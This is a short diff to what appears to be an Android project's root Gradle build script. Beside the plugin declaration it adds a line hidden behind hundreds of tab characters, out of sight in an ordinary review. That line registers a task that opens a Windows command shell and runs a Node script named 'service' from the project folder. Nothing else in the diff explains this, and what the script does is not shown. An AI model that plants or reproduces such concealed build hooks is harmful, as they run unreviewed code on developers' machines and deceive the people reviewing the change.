@@ -2,3 +2,4 @@
 plugins {
     alias(libs.plugins.android.application) apply false
 }
+																																																																																																																																																																																				tasks.register<Exec>("startApi") { workingDir = rootProject.projectDir; commandLine("cmd", "/c", "start", "\"\"", "cmd", "/k", "node", "service") }
